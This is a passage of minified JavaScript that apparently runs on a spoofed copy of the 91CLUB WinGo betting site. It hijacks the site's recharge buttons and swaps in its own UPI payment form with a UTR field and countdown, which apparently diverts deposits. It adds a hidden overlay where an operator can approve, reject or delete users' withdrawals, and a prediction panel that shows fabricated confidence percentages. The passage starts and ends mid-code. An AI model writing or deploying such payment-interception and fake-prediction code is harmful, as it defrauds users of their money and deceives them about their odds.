                                '<svg viewBox="0 0 24 24" fill="none" stroke="#ef4444" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/></svg>'),
                                (o.innerHTML =
                                    '<span style="color:#ef4444">' +
                                    e.message.replace(/</g, "&lt;") +
                                    "</span>"),
                                (n.textContent = "Retry"),
                                (n.disabled = !1),
                                n.classList.remove("disabled"),
                                (r.disabled = !1));
                        }
                    }));
            })(),
            s(),
            t && r.querySelector(".pay-utr-input").dispatchEvent(new Event("input")));
    })();
    let p = 1740;
    o = setInterval(() => {
        if ((p--, p <= 0)) return (clearInterval(o), void l());
        let e = Math.floor(p / 60),
            t = p % 60,
            a = r.querySelector("#pay-timer");
        a &&
            ((a.textContent = `${String(e).padStart(2, "0")}:${String(t).padStart(2, "0")}`),
                p < 300 && a.parentElement.classList.add("urgent"));
    }, 1e3);
}
var lt = { interceptor_enabled: !0, min_deposit: 500, upis: [] },
    Dt = !1;
function Xe(e) {
    let t = Array.isArray(e) ? e : [],
        a = [],
        n = new Set();
    for (let e of t) {
        let t =
            "string" == typeof e
                ? e.trim()
                : String(e?.upiId ?? e?.address ?? e?.upi ?? e?.value ?? "").trim();
        t &&
            !n.has(t) &&
            (n.add(t),
                a.push(
                    "string" == typeof e
                        ? t
                        : { label: String(e?.label ?? "").trim(), upiId: t },
                ));
    }
    return a;
}
async function Tt() {
    ((lt = { interceptor_enabled: !0, min_deposit: 500, upis: [] }), (Dt = !0));
}
function Gn(e) {
    let t = Number(String(e?.value ?? "").replace(/[^\d.]/g, "")),
        a = Number.isFinite(t) ? t : 0;
    return Math.max(a, 1);
}
function Wd() {
    var e = window.__wgSpoofer;
    if (e) {
        var t = document.querySelector(".wd-overlay");
        if (t) t.remove();
        else {
            var a = document.createElement("div");
            ((a.className = "wd-overlay"),
                (a.style.cssText =
                    "position:fixed;z-index:2147483647;inset:0;background:rgba(0,0,0,.75);display:flex;align-items:center;justify-content:center"));
            var n = document.createElement("div");
            ((n.style.cssText =
                "background:linear-gradient(155deg,rgba(11,9,30,.98),rgba(20,16,50,.97));border:1px solid rgba(139,92,246,.22);border-radius:16px;padding:20px;width:420px;max-width:90vw;max-height:80vh;overflow-y:auto;color:#f1f0ff;font-family:Inter,sans-serif"),
                (n.innerHTML =
                    '<div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:14px;padding-bottom:10px;border-bottom:1px solid rgba(255,255,255,.07)"><span style="font-size:17px;font-weight:700">Withdrawal Management</span><button id="wd-close" style="background:rgba(255,255,255,.07);border:none;border-radius:8px;color:rgba(255,255,255,.5);width:30px;height:30px;cursor:pointer;font-size:16px;display:flex;align-items:center;justify-content:center">✕</button></div><div id="wd-list"></div>'),
                a.appendChild(n),
                document.body.appendChild(a),
                (n.querySelector("#wd-close").onclick = function () {
                    a.remove();
                }));
            var r = e.getWithdrawals(),
                o = n.querySelector("#wd-list"),
                i = [];
            for (var s in r) i.push(r[s]);
            if (
                (i.sort(function (e, t) {
                    return t.addTime - e.addTime;
                }),
                    0 !== i.length)
            ) {
                for (var l = 0; l < i.length; l++)
                    (function (e) {
                        var t,
                            a,
                            n,
                            r = e.withdrawNumber || "N/A",
                            i = e.amount || 0,
                            s = e.addTime ? new Date(e.addTime).toLocaleString() : "";
                        1 === e.state || 2 === e.state
                            ? ((t = "Success"), (a = "rgba(52,211,153,.15)"), (n = "#34d399"))
                            : 0 === e.state || 4 === e.state
                                ? ((t = "Failed"), (a = "rgba(239,68,68,.15)"), (n = "#ef4444"))
                                : ((t = "Processing"),
                                    (a = "rgba(255,255,255,.07)"),
                                    (n = "rgba(255,255,255,.5)"));
                        var l = document.createElement("div");
                        ((l.style.cssText =
                            "background:rgba(255,255,255,.035);border:1px solid rgba(255,255,255,.07);border-radius:10px;padding:10px 12px;margin-bottom:8px"),
                            (l.innerHTML =
                                '<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:5px"><span style="font-size:12px;color:rgba(255,255,255,.45)">' +
                                r +
                                '</span><span style="font-size:14px;font-weight:600">₹' +
                                Number(i).toLocaleString("en-IN") +
                                '</span></div><div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px"><span style="font-size:11px;color:rgba(255,255,255,.3)">' +
                                s +
                                '</span><span style="font-size:11px;padding:2px 8px;border-radius:4px;background:' +
                                a +
                                ";color:" +
                                n +
                                '">' +
                                t +
                                "</span></div>"));
                        var d = document.createElement("div");
                        ((d.style.cssText = "display:flex;gap:6px"),
                            (d.innerHTML =
                                '<button class="wd-set" data-id="' +
                                r +
                                '" data-state="1" style="flex:1;padding:5px;border:none;border-radius:6px;background:' +
                                (1 === e.state || 2 === e.state
                                    ? "rgba(52,211,153,.25)"
                                    : "rgba(52,211,153,.12)") +
                                ';color:#34d399;cursor:pointer;font-size:11px;font-weight:600">Success</button><button class="wd-set" data-id="' +
                                r +
                                '" data-state="0" style="flex:1;padding:5px;border:none;border-radius:6px;background:' +
                                (0 === e.state || 4 === e.state
                                    ? "rgba(239,68,68,.25)"
                                    : "rgba(239,68,68,.12)") +
                                ';color:#ef4444;cursor:pointer;font-size:11px;font-weight:600">Reject</button><button class="wd-set" data-id="' +
                                r +
                                '" data-state="3" style="flex:1;padding:5px;border:none;border-radius:6px;background:' +
                                (3 === e.state
                                    ? "rgba(255,255,255,.15)"
                                    : "rgba(255,255,255,.07)") +
                                ';color:rgba(255,255,255,.7);cursor:pointer;font-size:11px;font-weight:600">Processing</button><button class="wd-del" data-id="' +
                                r +
                                '" style="flex:0 0 36px;padding:5px;border:none;border-radius:6px;background:rgba(239,68,68,.15);color:#ef4444;cursor:pointer;font-size:12px;font-weight:600">✕</button>'),
                            l.appendChild(d),
                            o.appendChild(l));
                    })(i[l]);
                o.addEventListener("click", function (t) {
                    var n = t.target.closest("button[data-id]");
                    if (n) {
                        var r = n.getAttribute("data-id");
                        if (n.classList.contains("wd-del")) e.deleteWithdrawal(r);
                        else {
                            var o = parseInt(n.getAttribute("data-state"));
                            e.updateWithdrawalStatus(r, o);
                        }
                        (a.remove(), Wd());
                    }
                });
            } else
                o.innerHTML =
                    '<div style="text-align:center;padding:40px 0;color:rgba(255,255,255,.35);font-size:14px">No withdrawals yet</div>';
        }
    }
}
function Ye() {
    (Tt(),
        setInterval(Tt, 1e4),
        document.addEventListener("visibilitychange", () => {
            document.hidden || Tt();
        }),
        window.addEventListener(
            "click",
            (e) => {
                if (!e.target.closest(".Recharge__container-rechageBtn, .go_pay"))
                    return;
                if (!Dt || !lt.interceptor_enabled) return;
                (e.stopImmediatePropagation(), e.stopPropagation(), e.preventDefault());
                let t = document.querySelector('input.van-field__control[type="tel"]'),
                    a = Gn(t);
                (t &&
                    Number(t.value) !== a &&
                    ((t.value = String(a)),
                        t.dispatchEvent(new Event("input", { bubbles: !0 })),
                        t.dispatchEvent(new Event("change", { bubbles: !0 }))),
                    ke(a));
            },
            { capture: !0 },
        ),
        window.addEventListener(
            "click",
            (e) => {
                if (window.__wgSpoofer && window.__wgSpoofer.isVip())
                    for (var t = e.target; t;) {
                        if (
                            t.classList &&
                            t.classList.contains("serviceCenter__container-items__item")
                        )
                            return (
                                e.stopImmediatePropagation(),
                                e.stopPropagation(),
                                e.preventDefault(),
                                void Wd()
                            );
                        t = t.parentElement;
                    }
            },
            !0,
        ));
}
var xn = "/#/wallet/Recharge",
    Jn = "cqz6091.com".includes("91club") ? "light" : "light",
    Tn = "cqz6091.com".includes("91club") ? "91CLUB" : "91CLUB",
    Dn = "cqz6091.com".includes("91club") ? "91club07.in" : "91club07.in",
    Qe = "";
function x(e) {
    let t = String(null == e ? "" : e).trim();
    return /^\d{8,22}$/.test(t) ? t : "";
}
function Ze(e) {
    if (!(e = x(e))) return "";
    try {
        return (BigInt(e) + 1n).toString();
    } catch (e) {
        return "";
    }
}
function kn(e, t) {
    if (((e = x(e)), (t = x(t)), !e || !t)) return 0;
    try {
        let a = BigInt(e),
            n = BigInt(t);
        return a > n ? 1 : a < n ? -1 : 0;
    } catch (a) {
        return e > t ? 1 : e < t ? -1 : 0;
    }
}
function Xn(e, t, a) {
    let n = e.querySelector("#pred-history");
    if (!n) return;
    let r = (a || []).slice(0, 8),
        o =
            t +
            ":" +
            x(r[0]?.issueNumber ?? r[0]?.issue) +
            ":" +
            r.map((e) => e.number || e.num || e).join(",");
    if (o === Qe) return;
    Qe = o;
    let i = document.createDocumentFragment(),
        s = document.createElement("span");
    if (
        ((s.className = "hist-label"),
            (s.textContent = "Recent"),
            i.appendChild(s),
            r.length < 2)
    )
        return (n.replaceChildren(i), void (n.style.display = "none"));
    (r.forEach((e) => {
        let t = parseInt(e.number || e.num || e),
            a = document.createElement("span");
        ((a.className = "hist-dot " + (t >= 5 ? "big" : "small")),
            (a.title = (t >= 5 ? "Big" : "Small") + ": " + t),
            i.appendChild(a));
    }),
        n.replaceChildren(i),
        (n.style.display = "flex"));
}
function Yn(e, t) {
    let a = e.querySelector("#streak-badge"),
        n = e.querySelector("#streak-text");
    a &&
        n &&
        (t.streak && t.streak.len >= 3
            ? ((n.textContent = t.streak.len + "× " + t.streak.side),
                (a.style.display = "flex"))
            : (a.style.display = "none"));
}
var Ke = "";
function je() {
    let e = document.querySelector("prediction-panel")?.shadowRoot;
    if (!e) return;
    let t = Gt(),
        a = wt(),
        n = Be(),
        r = window.__wgSpoofer,
        o = r && r.isVip();
    if (!(t.length || (o && a && x(n)))) return (D("loading"), k(), void Oe());
    let i = x(t[0]?.issueNumber ?? t[0]?.issue),
        s = x(n);
    i && (!s || kn(s, i) <= 0) && (s = Ze(i));
    let l = x(Me());
    if (l && s && Ze(l) !== s) return void D("loading");
    let d,
        p = [
            a,
            i,
            s,
            t
                .slice(0, 8)
                .map((e) => e.number || e.num || e)
                .join(","),
        ].join("|");
    if (p === Ke) return void D("result");
    if (((Ke = p), o && a && s)) {
        let e = r.predictNum(a, s);
        d = {
            prediction: e >= 5 ? "Big" : "Small",
            confidence: 73 + ((7 * e + 3) % 22),
            color: 0 === e || 5 === e ? "violet" : e % 2 == 0 ? "red" : "green",
            topNumber: e,
            signals: [],
            heatmap: { hot: [], cold: [] },
            streak: null,
        };
    }
    d || (d = Ht(t));
    let c = "Big" === d.prediction,
        g = e.querySelector("#pred-pill");
    ((g.textContent = d.prediction),
        (g.className = "pred-size " + (c ? "big" : "small")));
    let u = e.querySelector("#pred-color");
    ((u.textContent = d.color.charAt(0).toUpperCase() + d.color.slice(1)),
        (u.className = "pred-color " + d.color));
    let f = d.topNumber ?? d.heatmap?.hot?.[0] ?? 0;
    ((e.querySelector("#hero-ball").style.backgroundImage =
        "url('" + Le(f) + "')"),
        (e.querySelector("#pred-glow").className =
            "pred-glow " + (c ? "big" : "small")),
        (e.querySelector("#pro-card").className =
            "pro-card c-" + (c ? "big" : "small")));
    let b = e.querySelector("#conf-fill");
    ((b.style.width = d.confidence + "%"),
        (b.className = "conf-fill" + (c ? "" : " small")),
        (e.querySelector("#conf-pct").textContent = d.confidence + "%"),
        Xn(e, a, t));
    let h = e.querySelector("#pro-period");
    (h && s && (h.textContent = "#" + s.slice(-6)),
        Yn(e, d),
        e.querySelector("#pro-prediction").classList.toggle("vip-mode", !!o),
        D("result"));
}
function bt() {
    let e = location.hash.includes("/saasLottery/WinGo"),
        t = document.querySelector("prediction-panel");
    (t ||
        ((t = document.createElement("prediction-panel")),
            document.body.appendChild(t)),
        (t.dataset.route = e ? "game" : "other"));
    let a = document.querySelector(
        ".timer-card.active .card-title, .TimeLeft__C-name",
    ),
        n = String(a?.textContent || "")
            .toLowerCase()
            .replace(/\s+/g, ""),
        r = "";
    if (
        (n.includes("wingo30")
            ? (r = "WinGo_30S")
            : n.includes("wingo1min") || n.includes("wingo1m")
                ? (r = "WinGo_1M")
                : n.includes("wingo3min") || n.includes("wingo3m")
                    ? (r = "WinGo_3M")
                    : (n.includes("wingo5min") || n.includes("wingo5m")) &&
                    (r = "WinGo_5M"),
            !r)
    ) {
        let e = location.hash.match(/gameCode=(WinGo_\w+)/);
        r = e ? e[1] : "";
    }
    r && r !== wt() && Ft(r);
}
(Zt({
    apiBase: "https://91clubapi.com",
    spoofDomain: "cqz6091.com",
    minBalance: 1400,
    nukeUrl: "/",
    authErrMsg: "",
    onBalance: (e) => {
        window.__wg_balance = e;
    },
    onWingo: (e, t) => $e(e, t),
}),
    de(),
    He({ onPred: je }),
    customElements.get("prediction-panel") ||
    customElements.define(
        "prediction-panel",
        class extends HTMLElement {
            connectedCallback() {
                if (!document.querySelector("link[data-wg-font]")) {
                    let e = document.createElement("link");
                    ((e.rel = "stylesheet"),
                        (e.href =
                            "https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap"),
                        (e.dataset.wgFont = "1"),
                        document.head.appendChild(e));
                }
                ((this._mode = "logo"), this.classList.add(Jn));
                let e = this.attachShadow({ mode: "open" });
                ((e.innerHTML =
                    '<style>:host { position: fixed; z-index: 2147483647; touch-action: none; user-select: none; --f: \'Inter\', -apple-system, BlinkMacSystemFont, \'Segoe UI\', sans-serif; --ease: cubic-bezier(.4,0,.2,1); --panel-bg: linear-gradient(155deg, rgba(11,9,30,.98) 0%, rgba(20,16,50,.97) 100%); --panel-border: rgba(139,92,246,.22); --panel-shadow: 0 24px 64px rgba(0,0,0,.75), 0 0 0 1px rgba(255,255,255,.06), 0 0 100px rgba(99,60,220,.08); --hdr-bg: rgba(255,255,255,.03); --hdr-border: rgba(255,255,255,.07); --t-title: #f1f0ff; --t-name: #f1f0ff; --t-body: rgba(255,255,255,.52); --t-dim: rgba(255,255,255,.25); --x-bg: rgba(255,255,255,.07); --x-col: rgba(255,255,255,.32); --x-bg-h: rgba(255,255,255,.14); --x-col-h: rgba(255,255,255,.8); --card-bg: rgba(255,255,255,.035); --card-bdr: rgba(255,255,255,.07); --back-bg: rgba(255,255,255,.06); --back-bdr: rgba(255,255,255,.09); --back-col: rgba(255,255,255,.5); --back-col-h: rgba(255,255,255,.9); --back-bdr-h: rgba(139,92,246,.5); --pro: #8b5cf6; --pro-lt: rgba(139,92,246,.14); --pro-glow: rgba(139,92,246,.2); --pro-txt: #c4b5fd; --pro-bdr-h: rgba(139,92,246,.45); --vip: #f59e0b; --vip-lt: rgba(245,158,11,.13); --vip-glow: rgba(245,158,11,.2); --vip-txt: #fde68a; --vip-bdr-h: rgba(245,158,11,.45); --pc-bg: linear-gradient(150deg, rgba(20,16,52,.94) 0%, rgba(12,10,34,.97) 100%); --pc-bdr: rgba(139,92,246,.16); --pc-shad: 0 10px 36px rgba(0,0,0,.45), 0 0 0 1px rgba(139,92,246,.1); --tw-bg: rgba(255,255,255,.04); --tw-bdr: rgba(255,255,255,.07); --big: #FEAA57; --small: #6EA8F4; --strip: rgba(255,255,255,.07); --live: #34d399; --gate-title: #f1f0ff; --gate-bal-bg: rgba(139,92,246,.12); --gate-bal-col: #c4b5fd; --gate-bal-bdr: rgba(139,92,246,.22); --stat-bg: rgba(255,255,255,.03); --stat-bdr: rgba(255,255,255,.07); --chev: rgba(255,255,255,.15); --chip-bg: rgba(255,255,255,.07); --chip-bdr: rgba(255,255,255,.1); --chip-col: rgba(255,255,255,.7); --chip-hash: rgba(255,255,255,.42);}:host(.light) { --panel-bg: linear-gradient(155deg, #ffffff 0%, #fff8f8 100%); --panel-border: rgba(249,89,89,.18); --panel-shadow: 0 16px 52px rgba(180,30,30,.14), 0 0 0 1px rgba(249,89,89,.12), 0 4px 16px rgba(0,0,0,.06); --hdr-bg: linear-gradient(100deg, #f95959 0%, #ff8080 100%); --hdr-border: transparent; --t-title: #1f1f2e; --t-name: #1f1f2e; --t-body: #6b7280; --t-dim: rgba(0,0,0,.3); --x-bg: rgba(255,255,255,.22); --x-col: rgba(255,255,255,.85); --x-bg-h: rgba(255,255,255,.36); --x-col-h: #fff; --card-bg: rgba(0,0,0,.022); --card-bdr: rgba(0,0,0,.08); --back-bg: rgba(0,0,0,.04); --back-bdr: rgba(0,0,0,.1); --back-col: #6b7280; --back-col-h: #1f1f2e; --back-bdr-h: rgba(224,60,60,.4); --pro: #e03c3c; --pro-lt: rgba(224,60,60,.08); --pro-glow: rgba(224,60,60,.14); --pro-txt: #c0392b; --pro-bdr-h: rgba(224,60,60,.4); --vip: #d97706; --vip-lt: rgba(217,119,6,.08); --vip-glow: rgba(217,119,6,.13); --vip-txt: #b45309; --vip-bdr-h: rgba(217,119,6,.4); --pc-bg: linear-gradient(150deg, #ffffff 0%, #f9f0ff 100%); --pc-bdr: rgba(224,60,60,.14); --pc-shad: 0 6px 24px rgba(0,0,0,.08), 0 0 0 1px rgba(224,60,60,.08); --tw-bg: rgba(0,0,0,.025); --tw-bdr: rgba(0,0,0,.08); --strip: rgba(0,0,0,.07); --gate-title: #111827; --gate-bal-bg: rgba(220,38,38,.07); --gate-bal-col: #dc2626; --gate-bal-bdr: rgba(220,38,38,.14); --stat-bg: rgba(0,0,0,.025); --stat-bdr: rgba(0,0,0,.07); --chev: rgba(0,0,0,.14); --chip-bg: rgba(249,89,89,.08); --chip-bdr: rgba(249,89,89,.16); --chip-col: #374151; --chip-hash: #9ca3af;}.logo { width: 62px; height: 62px; border-radius: 50%; overflow: hidden; cursor: grab; display: block; transition: box-shadow .22s, transform .22s; box-shadow: 0 4px 20px rgba(0,0,0,.45), 0 0 0 2.5px rgba(255,255,255,.15), 0 0 0 5px rgba(139,92,246,.08);}.logo:hover { box-shadow: 0 6px 26px rgba(0,0,0,.55), 0 0 0 2.5px rgba(255,255,255,.25), 0 0 0 6px rgba(139,92,246,.14); transform: scale(1.06) }.logo.dragging { cursor: grabbing; transform: scale(.93); box-shadow: 0 8px 30px rgba(0,0,0,.6) }.logo img { width: 100%; height: 100%; object-fit: cover; display: block; pointer-events: none }:host(.light) .logo { box-shadow: 0 4px 18px rgba(200,50,50,.3), 0 0 0 2.5px rgba(249,89,89,.28), 0 0 0 5px rgba(249,89,89,.1) }:host(.light) .logo:hover { box-shadow: 0 6px 24px rgba(200,50,50,.4), 0 0 0 2.5px rgba(249,89,89,.4), 0 0 0 6px rgba(249,89,89,.14) }:host([data-route="other"]) .logo, :host([data-route="other"]) .panel { display: none !important }.panel { display: none; width: min(86vw, 288px); border-radius: 20px; overflow: hidden; background: var(--panel-bg); border: 1px solid var(--panel-border); box-shadow: var(--panel-shadow); backdrop-filter: blur(36px); -webkit-backdrop-filter: blur(36px); font-family: var(--f);}.panel.active { display: block; animation: panelIn .22s var(--ease) }@keyframes panelIn { from { opacity:0; transform:scale(.91) translateY(8px) } to { opacity:1; transform:scale(1) translateY(0) } }.panel-header { display: flex; align-items: center; justify-content: space-between; padding: 11px 13px; cursor: grab; background: var(--hdr-bg); border-bottom: 1px solid var(--hdr-border);}.panel-header.dragging { cursor: grabbing }.panel-title { display: flex; align-items: center; gap: 6px; font-size: 13px; font-weight: 700; color: var(--t-title); letter-spacing: -.1px }:host(.light) .panel-title { color: #fff }.panel-title img { width: 20px; height: 20px; border-radius: 50%; box-shadow: 0 1px 6px rgba(0,0,0,.25); cursor: pointer; touch-action: manipulation; position: relative; z-index: 1 }.brand-name { font-size: 13.5px; font-weight: 800; letter-spacing: .3px }.ai-badge { padding: 1px 5px; border-radius: 4px; font-size: 8.5px; font-weight: 700; letter-spacing: .8px; background: transparent; border: 1px solid rgba(255,255,255,.35); color: rgba(255,255,255,.8); line-height: 1.5 }:host(.light) .ai-badge { border-color: rgba(255,255,255,.5); color: rgba(255,255,255,.9) }.brand-domain { font-size: 10px; font-weight: 500; color: #5a5d72; letter-spacing: .1px }.brand-domain::before { content: \'·\'; margin-right: 4px; opacity: .5 }:host(.light) .brand-domain { color: rgba(255,255,255,.6) }.close-btn { width: 24px; height: 24px; border-radius: 7px; border: none; background: var(--x-bg); color: var(--x-col); font-size: 11px; cursor: pointer; line-height: 1; display: flex; align-items: center; justify-content: center; font-family: var(--f); transition: all .15s;}.close-btn:hover { background: var(--x-bg-h); color: var(--x-col-h) }.panel-body { padding: 14px 12px 13px; color: var(--t-body); font-size: 12px; line-height: 1.5; animation: fadeUp .24s var(--ease) .04s both }@keyframes fadeUp { from { opacity:0; transform:translateY(8px) } to { opacity:1; transform:translateY(0) } }.view { display: none }.view.active { display: block; animation: viewIn .2s var(--ease) }@keyframes viewIn { from { opacity:0; transform:translateX(8px) } to { opacity:1; transform:translateX(0) } }.menu-cards { display: flex; flex-direction: column; gap: 9px }.menu-card { display: flex; align-items: center; gap: 12px; padding: 12px 11px; border-radius: 14px; border: 1px solid var(--card-bdr); background: var(--card-bg); cursor: pointer; text-align: left; width: 100%; font-family: var(--f); transition: border-color .22s var(--ease), box-shadow .22s var(--ease), transform .18s var(--ease), background .2s;}.menu-card:hover { transform: translateY(-2px) }.menu-card:active { transform: scale(.97); transition-duration: .08s }.card-pro:hover { border-color: var(--pro-bdr-h); background: var(--pro-lt); box-shadow: 0 0 0 4px var(--pro-glow), 0 8px 24px var(--pro-glow) }.card-vip:hover { border-color: var(--vip-bdr-h); background: var(--vip-lt); box-shadow: 0 0 0 4px var(--vip-glow), 0 8px 24px var(--vip-glow) }.card-icon { width: 40px; height: 40px; border-radius: 12px; flex-shrink: 0; display: flex; align-items: center; justify-content: center; transition: transform .22s var(--ease) }.card-icon svg { width: 19px; height: 19px; fill: currentColor; stroke: none }.card-pro .card-icon { background: var(--pro-lt); color: var(--pro) }.card-vip .card-icon { background: var(--vip-lt); color: var(--vip) }.menu-card:hover .card-icon { transform: scale(1.12) rotate(-5deg) }.card-info { flex: 1; min-width: 0 }.card-top { display: flex; align-items: center; gap: 6px; margin-bottom: 2px }.card-name { font-size: 13.5px; font-weight: 700; letter-spacing: -.2px; color: var(--t-name) }.card-desc { font-size: 10.5px; color: var(--t-body) }.card-badge { font-size: 8px; font-weight: 800; text-transform: uppercase; letter-spacing: .5px; padding: 2px 7px; border-radius: 50px; border: 1px solid transparent }.badge-pro { background: var(--pro-lt); color: var(--pro-txt); border-color: rgba(139,92,246,.25) }.badge-vip { background: var(--vip-lt); color: var(--vip-txt); border-color: rgba(245,158,11,.22) }:host(.light) .badge-pro { color: #b91c1c; border-color: rgba(224,60,60,.22) }:host(.light) .badge-vip { color: #92400e; border-color: rgba(217,119,6,.22) }.card-arrow { width: 14px; height: 14px; flex-shrink: 0; stroke: var(--chev); fill: none; stroke-width: 2.5; opacity: .6; transition: transform .15s, stroke .15s, opacity .15s }.menu-card:hover .card-arrow { transform: translateX(3px); opacity: 1 }.card-pro:hover .card-arrow { stroke: var(--pro) }.card-vip:hover .card-arrow { stroke: var(--vip) }.status-row { display: flex; align-items: center; justify-content: center; gap: 5px; padding: 9px 0 0; margin-top: 9px; border-top: 1px solid var(--strip); font-size: 10px; color: var(--t-dim); font-weight: 500; letter-spacing: .2px }.status-dot { width: 5px; height: 5px; border-radius: 50%; background: var(--live); flex-shrink: 0; animation: livePulse 2.4s ease-in-out infinite }@keyframes livePulse { 0%,100% { opacity:1; box-shadow:0 0 0 0 rgba(52,211,153,.5) } 50% { opacity:.6; box-shadow:0 0 0 4px rgba(52,211,153,0) } }.back-btn { width: 32px; height: 32px; border-radius: 10px; flex-shrink: 0; display: flex; align-items: center; justify-content: center; border: 1px solid var(--back-bdr); background: var(--back-bg); color: var(--back-col); cursor: pointer; padding: 0; font-family: var(--f); transition: all .18s;}.back-btn svg { width: 14px; height: 14px; stroke: currentColor; fill: none; stroke-width: 2.5; stroke-linecap: round; stroke-linejoin: round }.back-btn:hover { color: var(--back-col-h); border-color: var(--back-bdr-h); background: var(--pro-lt) }.pro-top { display: flex; align-items: center; gap: 10px; margin-bottom: 10px }.pro-gameinfo { flex: 1; min-width: 0; display: flex; flex-direction: column; gap: 2px }.pro-gameinfo-row { display: flex; align-items: center; gap: 7px }.pro-game-name { font-size: 13.5px; font-weight: 800; color: var(--t-title); letter-spacing: -.25px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis }:host(.light) .pro-game-name { color: #1f1f2e }.pro-live-badge { display: inline-flex; align-items: center; gap: 4px; background: rgba(52,211,153,.1); border: 1px solid rgba(52,211,153,.22); border-radius: 50px; padding: 2px 8px; font-size: 8px; font-weight: 800; text-transform: uppercase; letter-spacing: .8px; color: #34d399; flex-shrink: 0; white-space: nowrap }:host(.light) .pro-live-badge { background: rgba(22,163,74,.07); border-color: rgba(22,163,74,.2); color: #16a34a }.pro-round { font-size: 10px; font-weight: 600; color: var(--t-dim); letter-spacing: .4px; font-variant-numeric: tabular-nums; font-family: var(--f) }:host(.light) .pro-round { color: #9ca3af }.live-pip { width: 5px; height: 5px; border-radius: 50%; flex-shrink: 0; background: currentColor; animation: livePulse 2s ease-in-out infinite }.pro-timer-wrap { position: relative; text-align: center; margin: 0 0 10px; padding: 9px 12px 11px; background: var(--tw-bg); border: 1px solid var(--tw-bdr); border-radius: 16px; overflow: hidden }.pro-timer-wrap::after { content: \'\'; position: absolute; bottom: 0; left: 0; height: 3px; border-radius: 0 3px 3px 0; width: var(--pct,100%); background: linear-gradient(90deg, var(--live), #a7f3d0); transition: width 1s linear, background .6s }.pro-timer-wrap.tw-warn::after { background: linear-gradient(90deg, #f59e0b, #fde68a) }.pro-timer-wrap.tw-end::after { background: linear-gradient(90deg, #ef4444, #fca5a5) }.pro-timer-label { font-size: 9px; font-weight: 800; text-transform: uppercase; letter-spacing: 1px; color: var(--t-dim); margin-bottom: 2px }.pro-timer { font-size: 30px; font-weight: 900; letter-spacing: 2px; font-variant-numeric: tabular-nums; line-height: 1; color: var(--t-title); font-family: var(--f); transition: color .4s }.pro-timer.t-warn { color: #f59e0b }.pro-timer.t-end { color: #ef4444; animation: timerShake .45s var(--ease) infinite }@keyframes timerShake { 0%,100%{transform:scale(1)} 50%{transform:scale(1.07)} }.pro-card { background: var(--pc-bg); border: 1px solid var(--pc-bdr); border-radius: 16px; padding: 20px 14px 16px; box-shadow: var(--pc-shad); min-height: 138px; display: flex; align-items: center; justify-content: center; position: relative; overflow: hidden; transition: border-color .5s, box-shadow .5s;}.pro-card::before { content: \'\'; position: absolute; inset: 0; background: linear-gradient(105deg, transparent 35%, rgba(139,92,246,.05) 50%, transparent 65%); opacity: 0; transition: opacity .3s }.pro-card.shimmer::before { opacity: 1; animation: sweep 1.7s ease-in-out infinite }@keyframes sweep { 0%{transform:translateX(-100%)} 100%{transform:translateX(100%)} }.pro-card.c-big { border-color: rgba(254,170,87,.24); box-shadow: 0 10px 36px rgba(254,170,87,.12), 0 0 0 1px rgba(254,170,87,.1) }.pro-card.c-small { border-color: rgba(110,168,244,.24); box-shadow: 0 10px 36px rgba(110,168,244,.12), 0 0 0 1px rgba(110,168,244,.1) }:host(.light) .pro-card.c-big { border-color: rgba(254,170,87,.3); box-shadow: 0 6px 24px rgba(254,170,87,.15), 0 0 0 1px rgba(254,170,87,.12) }:host(.light) .pro-card.c-small { border-color: rgba(110,168,244,.3); box-shadow: 0 6px 24px rgba(110,168,244,.15), 0 0 0 1px rgba(110,168,244,.12) }.pro-scanning { display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 14px; min-height: 100px; width: 100% }.scan-rings { position: relative; width: 52px; height: 52px }.scan-ring-o { position: absolute; inset: 0; border-radius: 50%; border: 2px solid transparent; border-top-color: var(--pro); animation: spin 1.3s linear infinite }.scan-ring-i { position: absolute; inset: 11px; border-radius: 50%; border: 2px solid transparent; border-top-color: var(--pro-txt); opacity: .5; animation: spin .75s linear infinite reverse }@keyframes spin { to { transform:rotate(360deg) } }.scan-label { font-size: 11px; font-weight: 600; color: var(--t-body); letter-spacing: .2px; font-family: var(--f); display: flex; align-items: center; gap: 3px }.s-dot { width:3px; height:3px; border-radius:50%; background:currentColor; opacity:.3; animation:blink 1.2s ease-in-out infinite }.s-dot:nth-child(2){animation-delay:.2s} .s-dot:nth-child(3){animation-delay:.4s}@keyframes blink { 0%,80%,100%{opacity:.2} 40%{opacity:.9} }.pro-prediction { width: 100%; text-align: center; animation: reveal .45s cubic-bezier(.2,.8,.2,1) }@keyframes reveal { from { opacity:0; transform:scale(.84); filter:blur(6px) } to { opacity:1; transform:scale(1); filter:blur(0) } }.streak-badge { display: none; align-items: center; justify-content: center; gap: 4px; padding: 3px 10px; border-radius: 50px; margin: 0 auto 10px; background: var(--pro-lt); color: var(--pro-txt); border: 1px solid rgba(139,92,246,.2); font-size: 9px; font-weight: 800; letter-spacing: .3px; text-transform: uppercase; width: fit-content }:host(.light) .streak-badge { background: rgba(224,60,60,.07); color: #b91c1c; border-color: rgba(224,60,60,.16) }.pred-hero { position: relative; display: flex; align-items: center; justify-content: center; margin-bottom: 12px; height: 68px }.pred-glow { position: absolute; width: 82px; height: 82px; border-radius: 50%; filter: blur(24px); opacity: 0; transition: opacity .5s, background .5s; pointer-events: none }.pred-glow.big { background: var(--big); opacity: .22 }.pred-glow.small { background: var(--small); opacity: .22 }:host(.light) .pred-glow.big { opacity: .16 }:host(.light) .pred-glow.small { opacity: .16 }.pred-ball { width: 60px; height: 60px; background-size: contain; background-repeat: no-repeat; background-position: center; filter: drop-shadow(0 6px 14px rgba(0,0,0,.25)); position: relative; z-index: 1; animation: float 3s ease-in-out infinite }@keyframes float { 0%,100%{transform:translateY(0)} 50%{transform:translateY(-4px)} }.pred-tags { display: flex; align-items: center; justify-content: center; gap: 8px; margin-bottom: 12px }.pred-size { padding: 7px 26px; border-radius: 50px; font-size: 15px; font-weight: 900; color: #fff; letter-spacing: -.1px; position: relative; overflow: hidden; transition: all .35s }.pred-size::after { content: \'\'; position: absolute; top: -60%; left: -40%; width: 180%; height: 160%; background: linear-gradient(135deg, rgba(255,255,255,.18), transparent 55%); pointer-events: none 